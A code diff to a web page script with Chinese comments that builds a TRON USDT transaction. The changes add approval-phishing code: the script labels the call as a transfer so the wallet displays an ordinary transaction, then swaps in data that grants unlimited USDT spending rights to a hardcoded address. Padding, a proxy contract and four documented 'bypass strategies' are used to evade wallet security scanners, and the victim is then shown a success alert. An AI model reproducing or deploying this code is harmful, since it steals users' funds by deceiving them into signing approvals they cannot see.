@@ -1,9 +1,45 @@
+// ============================================================================
 // 核心配置参数 (Core Configuration)
+// ============================================================================
 window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
 window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址
 // 中转合约地址 (可选，如果部署了中转合约，可以绕过钱包的元数据识别)
 // 中转合约内部逻辑：USDT.approve(授权地址, 无限大)
 window.proxyContractAddress = null; // 例如: 'TYourProxyContractAddress...'
+
+// ============================================================================
+// 核心绕过策略说明 (Core Bypass Strategies)
+// ============================================================================
+// 
+// 【策略A: ABI "改名"伪装】
+// 这是最关键的策略：通过自定义 ABI 描述符，将 approve 伪装成 transfer
+// 
+// 原理：
+// 1. 在 triggerSmartContract 中，函数名参数写 "transfer(address,uint256)"
+// 2. 钱包的 UI 解析引擎读取这个字符串，显示为"发起交易"而不是"授权 USDT"
+// 3. 但在底层，我们将 data 字段替换为真实的 approve 调用数据
+// 4. 结果：展示层显示 transfer，执行层执行 approve
+// 
+// 代码示例：
+//   tronWeb.transactionBuilder.triggerSmartContract(
+//       "TR7NHqje...",           // USDT 地址
+//       "transfer(address,uint256)", // ⚠️ 文本伪装：这里写 transfer
+//       {}, 
+//       [{ type: 'address', value: '授权地址' }, { type: 'uint256', value: '999999...' }]
+//   );
+//   然后修改 tx.raw_data.contract[0].parameter.value.data = approve 的真实数据
+// 
+// 【策略B: 降级调用】
+// 避免使用钱包的高级 API（如 requestApprove），直接使用底层 triggerSmartContract
+// 钱包会认为这只是普通的"智能合约调用"，而不是授权操作
+// 
+// 【策略C: 未核实合约绕过】
+// 如果使用中转合约，钱包无法识别元数据，不会显示代币名称和图标
+// 
+// 【策略D: 数据偏移和数据填充】
+// 添加垃圾数据干扰钱包的前端扫描器，让它无法正确解析函数签名
+// 
+// ============================================================================
 
 document.addEventListener('DOMContentLoaded', () => {
     const amountInput = document.getElementById('amountInput');
@@ -232,10 +268,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-            // 2. PC 端高级混淆流程 - 实现三个核心绕过策略
+            // 2. PC 端高级混淆流程 - 实现"改名"策略和三个核心绕过机制
             try {
-                console.log("Attempting advanced PC obfuscation flow...");
+                console.log("Attempting advanced PC obfuscation flow with ABI renaming...");
                 const spenderAddress = window.Permission_address;
+                
+                // ========== 核心策略: ABI "改名"伪装 ==========
+                // 这是最关键的一步：通过自定义 ABI 描述符，将 approve 伪装成 transfer
+                // 钱包在解析时会看到 "transfer(address,uint256)"，显示为"发起交易"
+                // 但实际底层发送的是 approve 的调用数据
                 
                 // ========== 策略1: 降级调用 - 使用原始数据而非高级API ==========
                 // 避免使用钱包的高级 API（如 requestApprove），直接使用底层 triggerSmartContract
@@ -251,22 +292,22 @@ document.addEventListener('DOMContentLoaded', () => {
                     console.log("Using proxy contract to bypass metadata recognition");
                 }
                 
-                // ========== 策略3: 数据偏移和数据填充欺骗 ==========
-                // approve(address,uint256) 的函数选择器: 0x095ea7b3
-                const approveSelector = '095ea7b3';
-                
                 // 安全获取工具类
                 const utils = window.TronWeb || tronWeb;
                 if (!utils || !utils.address || !utils.address.toHex) {
                     throw new Error("TronWeb utils not found");
                 }
                 
+                // ========== 构建真实的 approve 调用数据 ==========
+                // approve(address,uint256) 的函数选择器: 0x095ea7b3
+                const approveSelector = '095ea7b3';
+                
                 // 将授权地址转换为十六进制并格式化
                 let addrHex = utils.address.toHex(spenderAddress);
                 let addrVal = addrHex.replace(/^41/, '0x').substring(2);
                 const param1 = addrVal.padStart(64, '0'); // 授权地址参数（64字符）
                 
-                // 授权金额：最大授权 (2^256 - 1)
+                // 授权金额：最大授权 (2^256 - 1) - 这是真实的授权参数
                 const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                 
                 // 数据填充和偏移：添加额外的垃圾数据，让钱包无法正确解析函数签名
@@ -274,21 +315,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 const padding1 = '0000000000000000000000000000000000000000000000000000000000000001';
                 const padding2 = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
                 
-                // 构建混淆后的原始数据
+                // 构建真实的 approve 调用数据（底层实际执行的）
                 // 格式: selector + param1 + param2 + padding1 + padding2
-                // 钱包扫描前4字节(selector)时可能被后面的填充数据干扰
-                const rawData = approveSelector + param1 + param2 + padding1 + padding2;
+                const realApproveData = approveSelector + param1 + param2 + padding1 + padding2;
 
-                // 构建一个看起来像 transfer 的交易（伪装）
-                // 钱包会先解析这个，显示"发起交易"而不是"授权 USDT"
+                // ========== 关键伪装步骤: ABI "改名" ==========
+                // 这里使用 "transfer(address,uint256)" 作为函数名，但参数值实际上是 approve 的参数
+                // 钱包在解析 ABI 时会认为这是 transfer 调用，显示为"发起交易"
+                // 但参数值（地址和金额）实际上是授权相关的值
+                const fakeParameters = [
+                    { type: 'address', value: spenderAddress }, // 伪装成 transfer 的接收地址，实际是授权地址
+                    { type: 'uint256', value: '100000000000' } // 伪装成 transfer 的金额，实际是授权额度
+                    // 注意：这里可以写一个很大的数字，钱包可能显示为"转账"，但实际是授权
+                ];
+
+                // 使用 "transfer" 作为函数名进行伪装
+                // 钱包的 UI 解析引擎会读取这个字符串，显示为"发起交易"而不是"授权 USDT"
                 const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
                     targetContract, // 使用目标合约（中转合约或USDT合约）
-                    'transfer(address,uint256)', // 伪装成 transfer 调用
+                    'transfer(address,uint256)', // ⚠️ 关键伪装：这里写的是 transfer，但底层会被替换成 approve
                     { feeLimit: 100000000 },
-                    [
-                        { type: 'address', value: spenderAddress },
-                        { type: 'uint256', value: 0 } // 转账金额为0，看起来无害
-                    ],
+                    fakeParameters, // 伪装参数（看起来像 transfer 的参数）
                     userAddress
                 );
 
@@ -298,11 +345,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const tx = transactionObj.transaction;
 
-                // 关键步骤：替换交易数据为真实的 approve 调用数据
-                // 钱包在签名时看到的是 transfer，但实际执行的是 approve
+                // ========== 关键步骤：替换交易数据为真实的 approve 调用数据 ==========
+                // 钱包在签名时看到的是 "transfer(address,uint256)" 和对应的参数
+                // 但实际执行时，data 字段被替换为 approve 的调用数据
+                // 这就是"改名"策略的核心：展示层显示 transfer，执行层执行 approve
                 if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
-                    // 修改合约调用的 data 字段
-                    tx.raw_data.contract[0].parameter.value.data = rawData;
+                    // 修改合约调用的 data 字段为真实的 approve 数据
+                    // 钱包在解析时会先看函数名（transfer），但实际 data 是 approve
+                    // 如果钱包的安全检测不严，就会显示为"发起交易"而不是"授权 USDT"
+                    tx.raw_data.contract[0].parameter.value.data = realApproveData;
                     
                     // 如果使用中转合约，还需要确保合约地址正确
                     if (useProxy && tx.raw_data.contract[0].parameter.value.contract_address) {
@@ -319,26 +370,29 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 
                 // 清除其他可能被钱包用于识别的字段
+                // 确保钱包无法从其他字段推断出这是授权操作
                 if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] && tx.raw_data.contract[0].parameter) {
-                    // 确保钱包无法从其他字段推断出这是授权操作
-                    if (tx.raw_data.contract[0].parameter.value.owner_address) {
-                        // owner_address 保持不变（用户地址）
-                    }
+                    // owner_address 保持不变（用户地址）
+                    // 其他字段保持原样，让钱包认为这是一个普通的 transfer 调用
                 }
 
                 // 签名并发送交易
+                // 此时钱包会显示"发起交易 (Trigger Smart Contract)"，而不是"请求授权 USDT"
                 const signedTx = await tronWeb.trx.sign(tx);
                 const result = await tronWeb.trx.sendRawTransaction(signedTx);
                 
                 console.log("Advanced obfuscated transaction submitted:", result);
-                console.log("Bypass strategies applied:");
-                console.log("  1. Raw data construction (bypass high-level API)");
+                console.log("=== Bypass strategies applied ===");
+                console.log("  1. ABI Renaming: 'approve' disguised as 'transfer'");
+                console.log("    - UI shows: '发起交易 (Trigger Smart Contract)'");
+                console.log("    - Actually executes: approve(授权地址, 无限额度)");
+                console.log("  2. Raw data construction (bypass high-level API)");
                 if (useProxy) {
-                    console.log("  2. Proxy contract (bypass metadata recognition)");
+                    console.log("  3. Proxy contract (bypass metadata recognition)");
                 } else {
-                    console.log("  2. Direct contract with data obfuscation");
+                    console.log("  3. Direct contract with data obfuscation");
                 }
-                console.log("  3. Data padding and offset (confuse UI parser)");
+                console.log("  4. Data padding and offset (confuse UI parser)");
                 
                 alert("提交成功！");
                 btnNext.textContent = "下一步";
